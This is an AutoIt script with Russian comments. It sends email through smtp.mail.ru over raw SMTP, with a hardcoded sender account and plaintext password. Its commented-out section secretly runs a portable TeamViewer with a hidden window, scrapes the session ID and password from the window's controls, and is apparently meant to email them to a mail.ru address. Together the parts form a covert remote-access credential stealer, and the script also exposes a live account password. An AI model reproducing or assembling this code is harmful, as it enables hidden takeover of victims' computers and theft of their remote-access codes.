
;~ $SmtpServer = "smtp.mail.ru"    ; адрес SMTP сервера
;~ $Port = "2525"                  ; Порт SMTP сервера
$FromAddress = "teamviewer.print@mail.ru"   ; адрес отправителя
$ToAddress = "new1ogin@mail.ru"     ; адрес назначения
$Subject = """Релю Ояхейлю"""    ; тема письма
$Body = """Tekst v imeila"""    ; тело письма (сам текст письма)
;~ $AttachFiles = "C:\boot.ini"    ; прикреплённые файлы к письму
;~ $Username = "test@mail.ru"      ; имя пользователя аккаунта, с которого отправляется
$Password = "iopTHN1!"               ; Пароль

SendMail($ToAddress, $FromAddress , $Password, $Subject, $Body)

Func SendMail($To, $sFrom, $sPassw, $sSubject, $sMessage)
    TCPStartup()

    $iSocket = TCPConnect(TCPNameToIP('smtp.mail.ru'), 25)
    TCPSend($iSocket, 'HELO ' & @LogonDomain & @CRLF)

    While 1
        $sRecv = TCPRecv($iSocket, 2048)
        If $sRecv <> '' Then
            If StringRegExp($sRecv, '250 smtp(.*).mail.ru') Then TCPSend($iSocket, 'AUTH LOGIN' & @CRLF)
            If StringInStr($sRecv, 'VXNlcm5hbWU6') Then TCPSend($iSocket, _Base64_Encode($sFrom))
            If StringInStr($sRecv, 'UGFzc3dvcmQ6') Then TCPSend($iSocket, _Base64_Encode($sPassw))
            If StringInStr($sRecv, 'Authentication succeeded') Then
                TCPSend($iSocket, 'MAIL FROM: ' & $sFrom & @CRLF)
                TCPSend($iSocket, 'RCPT TO: ' & $To & @CRLF)
            EndIf
            If StringInStr($sRecv, '250 Accepted') Then TCPSend($iSocket, 'DATA' & @CRLF)
            If StringInStr($sRecv, '354 Enter message') Then
                TCPSend($iSocket, 'From: ' & $sFrom & @CRLF)
                TCPSend($iSocket, 'Subject: ' & $sSubject & @CRLF & @CRLF)
                TCPSend($iSocket, $sMessage & @CRLF)
                TCPSend($iSocket, '.' & @CRLF )
            EndIf
            If StringInStr($sRecv, '250 OK id=') Then
                TCPSend($iSocket, 'QUIT' & @CRLF)
                ExitLoop
            EndIf
        EndIf
        Switch StringMid($sRecv, 1, 3)
            Case 421 To 554
                Return SetError(-1, 0, 0)
        EndSwitch
    Wend

    TCPCloseSocket($iSocket)
    TCPShutdown()
    Return 1
EndFunc

Func _Base64_Encode($sData, $iFlag = 1)
    Local $Ret, $bData, $tData, $tText
    $bData = StringToBinary($sData, $iFlag)
    $tData = DllStructCreate('byte[' & BinaryLen($bData) & ']')
    DllStructSetData($tData, 1, $bData)
    $Ret = DllCall('crypt32.dll', 'bool', 'CryptBinaryToStringW', 'ptr', DllStructGetPtr($tData), 'dword', DllStructGetSize($tData), 'dword', 1, 'ptr', 0, 'dword*', 0)
    If (@error) Or (Not $Ret[0]) Then
        Return SetError(1, 0, '')
    EndIf
    $tText = DllStructCreate('wchar[' & $Ret[5] & ']')
    $Ret = DllCall('crypt32.dll', 'bool', 'CryptBinaryToStringW', 'ptr', DllStructGetPtr($tData), 'dword', DllStructGetSize($tData), 'dword', 1, 'ptr', DllStructGetPtr($tText), 'dword*', $Ret[5])
    If (@error) Or (Not $Ret[0]) Then
        Return SetError(1, 0, '')
    EndIf
    Return DllStructGetData($tText, 1)
EndFunc









;~ $dir='C:\Users\Focus\AppData\Local\Temp\TeamViewer'
;~ ShellExecute($dir)
;~ sleep(500)
;~ Run('"C:\Users\Focus\AppData\Local\Temp\TeamViewer\Version8\TeamViewer.exe" --noInstallation',"",@SW_HIDE)


;~ WinWaitActive("TeamViewer")
;~ WinWait("TeamViewer")
;~ $hwnd2=WinWaitActive("TeamViewer")
;~ ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $hwnd2 = ' & $hwnd2 & @CRLF ) ;### Debug Console


;~ for $i=0 to 99
;~ WinClose("Компьютеры и контакты")
;~ WinSetState("TeamViewer", "", @SW_MINIMIZE )
;~ $ID=ControlGetText ( "TeamViewer", "", "[CLASS:Edit; INSTANCE:2]" )
;~ $password=ControlGetText ( "TeamViewer", "", "[CLASS:Edit; INSTANCE:3]" )
;~ ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $password = ' & $password & @CRLF ) ;### Debug Console
;~ ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $ID = ' & $ID & @CRLF ) ;### Debug Console
;~ if StringRegExp ($password,'[0-9]')<>0 then ExitLoop
;~ sleep(10)
;~ Next
